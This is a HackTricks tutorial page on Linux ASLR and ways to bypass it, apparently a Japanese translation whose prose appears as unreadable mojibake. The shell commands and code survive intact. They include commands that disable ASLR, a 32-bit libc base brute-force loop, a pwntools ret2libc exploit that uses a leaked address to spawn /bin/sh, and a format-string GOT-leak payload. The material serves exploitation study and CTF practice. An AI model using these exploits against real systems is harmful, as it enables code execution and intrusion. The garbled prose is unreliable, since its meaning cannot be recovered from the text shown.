# ASLR

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## åŸºæœ¬æƒ…å ±

**ã‚¢ãƒ‰ãƒ¬ã‚¹ç©ºé–“é…ç½®ãƒ©ãƒ³ãƒ€ãƒ åŒ–ï¼ˆASLRï¼‰**ã¯ã€ã‚ªãƒšãƒ¬ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã‚·ã‚¹ãƒ†ãƒ ã§ä½¿ç”¨ã•ã‚Œã‚‹ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£æŠ€è¡“ã§ã€**ã‚·ã‚¹ãƒ†ãƒ ãŠã‚ˆã³ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ã«ã‚ˆã£ã¦ä½¿ç”¨ã•ã‚Œã‚‹ãƒ¡ãƒ¢ãƒªã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ãƒ©ãƒ³ãƒ€ãƒ åŒ–**ã—ã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€æ”»æ’ƒè€…ãŒç‰¹å®šã®ãƒ—ãƒ­ã‚»ã‚¹ã‚„ãƒ‡ãƒ¼ã‚¿ï¼ˆã‚¹ã‚¿ãƒƒã‚¯ã€ãƒ’ãƒ¼ãƒ—ã€ãƒ©ã‚¤ãƒ–ãƒ©ãƒªãªã©ï¼‰ã®ä½ç½®ã‚’äºˆæ¸¬ã™ã‚‹ã“ã¨ãŒè‘—ã—ãé›£ã—ããªã‚Šã€ç‰¹ã«ãƒãƒƒãƒ•ã‚¡ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ãªã©ã®ç‰¹å®šã®ã‚¿ã‚¤ãƒ—ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’è»½æ¸›ã—ã¾ã™ã€‚

### **ASLRã®çŠ¶æ…‹ã‚’ç¢ºèªã™ã‚‹**

Linuxã‚·ã‚¹ãƒ†ãƒ ã§ASLRã®çŠ¶æ…‹ã‚’**ç¢ºèªã™ã‚‹**ã«ã¯ã€`/proc/sys/kernel/randomize_va_space`ãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰å€¤ã‚’èª­ã¿å–ã‚Šã¾ã™ã€‚ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«ä¿å­˜ã•ã‚Œã¦ã„ã‚‹å€¤ã¯ã€é©ç”¨ã•ã‚Œã‚‹ASLRã®ã‚¿ã‚¤ãƒ—ã‚’æ±ºå®šã—ã¾ã™ï¼š

* **0**: ãƒ©ãƒ³ãƒ€ãƒ åŒ–ãªã—ã€‚ã™ã¹ã¦ãŒé™çš„ã§ã™ã€‚
* **1**: ä¿å®ˆçš„ãªãƒ©ãƒ³ãƒ€ãƒ åŒ–ã€‚å…±æœ‰ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã€ã‚¹ã‚¿ãƒƒã‚¯ã€mmap()ã€VDSOãƒšãƒ¼ã‚¸ãŒãƒ©ãƒ³ãƒ€ãƒ åŒ–ã•ã‚Œã¾ã™ã€‚
* **2**: å®Œå…¨ãªãƒ©ãƒ³ãƒ€ãƒ åŒ–ã€‚ä¿å®ˆçš„ãªãƒ©ãƒ³ãƒ€ãƒ åŒ–ã«ã‚ˆã£ã¦ãƒ©ãƒ³ãƒ€ãƒ åŒ–ã•ã‚ŒãŸè¦ç´ ã«åŠ ãˆã¦ã€`brk()`ã‚’é€šã˜ã¦ç®¡ç†ã•ã‚Œã‚‹ãƒ¡ãƒ¢ãƒªãŒãƒ©ãƒ³ãƒ€ãƒ åŒ–ã•ã‚Œã¾ã™ã€‚

æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã§ASLRã®çŠ¶æ…‹ã‚’ç¢ºèªã§ãã¾ã™ï¼š
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **ASLRã®ç„¡åŠ¹åŒ–**

ASLRã‚’**ç„¡åŠ¹åŒ–**ã™ã‚‹ã«ã¯ã€`/proc/sys/kernel/randomize_va_space`ã®å€¤ã‚’**0**ã«è¨­å®šã—ã¾ã™ã€‚ASLRã‚’ç„¡åŠ¹åŒ–ã™ã‚‹ã“ã¨ã¯ã€ãƒ†ã‚¹ãƒˆã‚„ãƒ‡ãƒãƒƒã‚°ã®ã‚·ãƒŠãƒªã‚ªä»¥å¤–ã§ã¯ä¸€èˆ¬çš„ã«æ¨å¥¨ã•ã‚Œã¾ã›ã‚“ã€‚ç„¡åŠ¹åŒ–ã™ã‚‹æ–¹æ³•ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
ASLRã‚’ç„¡åŠ¹ã«ã—ã¦å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **ASLRã®æœ‰åŠ¹åŒ–**

ASLRã‚’**æœ‰åŠ¹åŒ–**ã™ã‚‹ã«ã¯ã€`/proc/sys/kernel/randomize_va_space`ãƒ•ã‚¡ã‚¤ãƒ«ã«**2**ã®å€¤ã‚’æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã¯é€šå¸¸ã€rootæ¨©é™ãŒå¿…è¦ã§ã™ã€‚å®Œå…¨ãªãƒ©ãƒ³ãƒ€ãƒ åŒ–ã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã§è¡Œã†ã“ã¨ãŒã§ãã¾ã™ï¼š
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **å†èµ·å‹•æ™‚ã®æŒç¶šæ€§**

`echo` ã‚³ãƒãƒ³ãƒ‰ã§è¡Œã£ãŸå¤‰æ›´ã¯ä¸€æ™‚çš„ã§ã‚ã‚Šã€å†èµ·å‹•æ™‚ã«ãƒªã‚»ãƒƒãƒˆã•ã‚Œã¾ã™ã€‚å¤‰æ›´ã‚’æŒç¶šã•ã›ã‚‹ã«ã¯ã€`/etc/sysctl.conf` ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ç·¨é›†ã—ã€ä»¥ä¸‹ã®è¡Œã‚’è¿½åŠ ã¾ãŸã¯ä¿®æ­£ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼š
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
`/etc/sysctl.conf`ã‚’ç·¨é›†ã—ãŸå¾Œã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã§å¤‰æ›´ã‚’é©ç”¨ã—ã¾ã™:
```bash
sudo sysctl -p
```
This will ensure that your ASLR settings remain across reboots.

## **ãƒã‚¤ãƒ‘ã‚¹**

### 32ãƒ“ãƒƒãƒˆãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

PaXã¯ãƒ—ãƒ­ã‚»ã‚¹ã‚¢ãƒ‰ãƒ¬ã‚¹ç©ºé–“ã‚’**3ã¤ã®ã‚°ãƒ«ãƒ¼ãƒ—**ã«åˆ†ã‘ã¾ã™ï¼š

* **ã‚³ãƒ¼ãƒ‰ã¨ãƒ‡ãƒ¼ã‚¿**ï¼ˆåˆæœŸåŒ–æ¸ˆã¿ãŠã‚ˆã³æœªåˆæœŸåŒ–ï¼‰ï¼š`.text`ã€`.data`ã€ãŠã‚ˆã³`.bss` â€”> `delta_exec`å¤‰æ•°ã«**16ãƒ“ãƒƒãƒˆ**ã®ã‚¨ãƒ³ãƒˆãƒ­ãƒ”ãƒ¼ã€‚ã“ã®å¤‰æ•°ã¯å„ãƒ—ãƒ­ã‚»ã‚¹ã§ãƒ©ãƒ³ãƒ€ãƒ ã«åˆæœŸåŒ–ã•ã‚Œã€åˆæœŸã‚¢ãƒ‰ãƒ¬ã‚¹ã«åŠ ç®—ã•ã‚Œã¾ã™ã€‚
* `mmap()`ã«ã‚ˆã£ã¦å‰²ã‚Šå½“ã¦ã‚‰ã‚ŒãŸ**ãƒ¡ãƒ¢ãƒª**ãŠã‚ˆã³**å…±æœ‰ãƒ©ã‚¤ãƒ–ãƒ©ãƒª** â€”> **16ãƒ“ãƒƒãƒˆ**ã€`delta_mmap`ã¨å‘¼ã°ã‚Œã¾ã™ã€‚
* **ã‚¹ã‚¿ãƒƒã‚¯** â€”> **24ãƒ“ãƒƒãƒˆ**ã€`delta_stack`ã¨å‘¼ã°ã‚Œã¾ã™ã€‚ãŸã ã—ã€å®Ÿéš›ã«ã¯**11ãƒ“ãƒƒãƒˆ**ï¼ˆ10ãƒã‚¤ãƒˆç›®ã‹ã‚‰20ãƒã‚¤ãƒˆç›®ã¾ã§ã‚’å«ã‚€ï¼‰ã‚’ä½¿ç”¨ã—ã€**16ãƒã‚¤ãƒˆ**ã«æ•´åˆ—ã•ã‚Œã¦ã„ã¾ã™ â€”> ã“ã‚Œã«ã‚ˆã‚Šã€**524,288ã®å®Ÿéš›ã®ã‚¹ã‚¿ãƒƒã‚¯ã‚¢ãƒ‰ãƒ¬ã‚¹**ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚

å‰è¿°ã®ãƒ‡ãƒ¼ã‚¿ã¯32ãƒ“ãƒƒãƒˆã‚·ã‚¹ãƒ†ãƒ ç”¨ã§ã‚ã‚Šã€æœ€çµ‚çš„ãªã‚¨ãƒ³ãƒˆãƒ­ãƒ”ãƒ¼ãŒæ¸›å°‘ã™ã‚‹ã“ã¨ã§ã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆãŒæˆåŠŸã™ã‚‹ã¾ã§å®Ÿè¡Œã‚’ä½•åº¦ã‚‚å†è©¦è¡Œã™ã‚‹ã“ã¨ã§ASLRã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã«ãªã‚Šã¾ã™ã€‚

#### ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã®ã‚¢ã‚¤ãƒ‡ã‚¢ï¼š

* ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã®å‰ã«**å¤§ããªNOPã‚¹ãƒ¬ãƒƒãƒ‰**ã‚’ãƒ›ã‚¹ãƒˆã™ã‚‹ã®ã«ååˆ†ãªã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ãŒã‚ã‚‹å ´åˆã€ã‚¹ã‚¿ãƒƒã‚¯å†…ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã—ã¦**NOPã‚¹ãƒ¬ãƒƒãƒ‰ã®ä¸€éƒ¨ã‚’é£›ã³è¶Šãˆã‚‹**ã¾ã§è©¦ã™ã“ã¨ãŒã§ãã¾ã™ã€‚
* ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ãŒãã‚Œã»ã©å¤§ãããªãã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’ãƒ­ãƒ¼ã‚«ãƒ«ã§å®Ÿè¡Œã§ãã‚‹å ´åˆã¯ã€**ç’°å¢ƒå¤‰æ•°ã«NOPã‚¹ãƒ¬ãƒƒãƒ‰ã¨ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’è¿½åŠ ã™ã‚‹**ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚
* ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆãŒãƒ­ãƒ¼ã‚«ãƒ«ã§ã‚ã‚‹å ´åˆã€libcã®ãƒ™ãƒ¼ã‚¹ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹ã“ã¨ã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆ32ãƒ“ãƒƒãƒˆã‚·ã‚¹ãƒ†ãƒ ã«ä¾¿åˆ©ï¼‰ï¼š
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* ãƒªãƒ¢ãƒ¼ãƒˆã‚µãƒ¼ãƒãƒ¼ã‚’æ”»æ’ƒã™ã‚‹å ´åˆã€**`libc`é–¢æ•°`usleep`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹**ã“ã¨ã‚’è©¦ã¿ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚å¼•æ•°ã¨ã—ã¦10ã‚’æ¸¡ã—ã¾ã™ï¼ˆä¾‹ãˆã°ï¼‰ã€‚ã‚‚ã—ã‚ã‚‹æ™‚ç‚¹ã§**ã‚µãƒ¼ãƒãƒ¼ãŒå¿œç­”ã™ã‚‹ã®ã«10ç§’ä½™åˆ†ã«ã‹ã‹ã‚‹**å ´åˆã€ã“ã®é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¦‹ã¤ã‘ãŸã“ã¨ã«ãªã‚Šã¾ã™ã€‚

{% hint style="success" %}
64ãƒ“ãƒƒãƒˆã‚·ã‚¹ãƒ†ãƒ ã§ã¯ã‚¨ãƒ³ãƒˆãƒ­ãƒ”ãƒ¼ãŒã¯ã‚‹ã‹ã«é«˜ãã€ã“ã‚Œã¯ä¸å¯èƒ½ã§ã™ã€‚
{% endhint %}

### ãƒ­ãƒ¼ã‚«ãƒ«æƒ…å ± (`/proc/[pid]/stat`)

ãƒ—ãƒ­ã‚»ã‚¹ã®**`/proc/[pid]/stat`**ãƒ•ã‚¡ã‚¤ãƒ«ã¯å¸¸ã«èª°ã§ã‚‚èª­ã¿å–ã‚‹ã“ã¨ãŒã§ãã€**èˆˆå‘³æ·±ã„**æƒ…å ±ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ï¼š

* **startcode** & **endcode**: ãƒã‚¤ãƒŠãƒªã®**TEXT**ã®ä¸Šã¨ä¸‹ã®ã‚¢ãƒ‰ãƒ¬ã‚¹
* **startstack**: **ã‚¹ã‚¿ãƒƒã‚¯**ã®é–‹å§‹ã‚¢ãƒ‰ãƒ¬ã‚¹
* **start\_data** & **end\_data**: **BSS**ã®ä¸Šã¨ä¸‹ã®ã‚¢ãƒ‰ãƒ¬ã‚¹
* **kstkesp** & **kstkeip**: ç¾åœ¨ã®**ESP**ã¨**EIP**ã‚¢ãƒ‰ãƒ¬ã‚¹
* **arg\_start** & **arg\_end**: **CLIå¼•æ•°**ã®ä¸Šã¨ä¸‹ã®ã‚¢ãƒ‰ãƒ¬ã‚¹
* **env\_start** & **env\_end**: **ç’°å¢ƒå¤‰æ•°**ã®ä¸Šã¨ä¸‹ã®ã‚¢ãƒ‰ãƒ¬ã‚¹

ã—ãŸãŒã£ã¦ã€æ”»æ’ƒè€…ãŒã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã•ã‚Œã¦ã„ã‚‹ãƒã‚¤ãƒŠãƒªã¨åŒã˜ã‚³ãƒ³ãƒ”ãƒ¥ãƒ¼ã‚¿ã«ã„ã‚‹å ´åˆã€ã“ã®ãƒã‚¤ãƒŠãƒªãŒç”Ÿã®å¼•æ•°ã‹ã‚‰ã®ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã‚’æœŸå¾…ã—ã¦ã„ãªã„ãŒã€ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã£ãŸå¾Œã«ä½œæˆã§ãã‚‹åˆ¥ã®**å…¥åŠ›ã‹ã‚‰ã®ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã‚’æœŸå¾…ã—ã¦ã„ã‚‹å ´åˆ**ã€æ”»æ’ƒè€…ã¯**ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‹ã‚‰ã„ãã¤ã‹ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’å–å¾—ã—ã€ãã‚Œã‚‰ã‹ã‚‰ã‚ªãƒ•ã‚»ãƒƒãƒˆã‚’æ§‹ç¯‰ã—ã¦ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’è¡Œã†**ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

{% hint style="success" %}
ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«é–¢ã™ã‚‹è©³ç´°ã¯ã€[https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html)ã§`/proc/pid/stat`ã‚’æ¤œç´¢ã—ã¦ãã ã•ã„ã€‚
{% endhint %}

### ãƒªãƒ¼ã‚¯ã‚’æŒã¤ã“ã¨

* **èª²é¡Œã¯ãƒªãƒ¼ã‚¯ã‚’æä¾›ã™ã‚‹ã“ã¨ã§ã™**

ãƒªãƒ¼ã‚¯ãŒä¸ãˆã‚‰ã‚ŒãŸå ´åˆï¼ˆç°¡å˜ãªCTFãƒãƒ£ãƒ¬ãƒ³ã‚¸ï¼‰ã€ãã‚Œã‹ã‚‰ã‚ªãƒ•ã‚»ãƒƒãƒˆã‚’è¨ˆç®—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼ˆä¾‹ãˆã°ã€ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã—ã¦ã„ã‚‹ã‚·ã‚¹ãƒ†ãƒ ã§ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹æ­£ç¢ºãªlibcãƒãƒ¼ã‚¸ãƒ§ãƒ³ã‚’çŸ¥ã£ã¦ã„ã‚‹ã¨ä»®å®šã—ã¾ã™ï¼‰ã€‚ã“ã®ä¾‹ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã¯ã€[**ã“ã“ã‹ã‚‰ã®ä¾‹**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak)ã‹ã‚‰æŠœç²‹ã•ã‚Œã¦ã„ã¾ã™ï¼ˆè©³ç´°ã¯ãã®ãƒšãƒ¼ã‚¸ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼‰ï¼š
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

ãƒãƒƒãƒ•ã‚¡ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ã§ã€**ret2plt**ã‚’åˆ©ç”¨ã—ã¦libcã®é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **Format Strings Arbitrary Read**

ret2pltã¨åŒæ§˜ã«ã€ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—ã®è„†å¼±æ€§ã‚’ä»‹ã—ã¦ä»»æ„ã®èª­ã¿å–ã‚ŠãŒå¯èƒ½ã§ã‚ã‚Œã°ã€GOTã‹ã‚‰**libcé–¢æ•°**ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚æ¬¡ã®[**ä¾‹ã¯ã“ã“ã‹ã‚‰**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got)ã§ã™ï¼š
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
You can find more info about Format Strings arbitrary read in:

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret & Ret2pop

ã‚¹ã‚¿ãƒƒã‚¯å†…ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ‚ªç”¨ã—ã¦ASLRã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã‚ˆã†ã¨ã—ã¾ã™:

{% content-ref url="../../stack-overflow/ret2ret.md" %}
[ret2ret.md](../../stack-overflow/ret2ret.md)
{% endcontent-ref %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
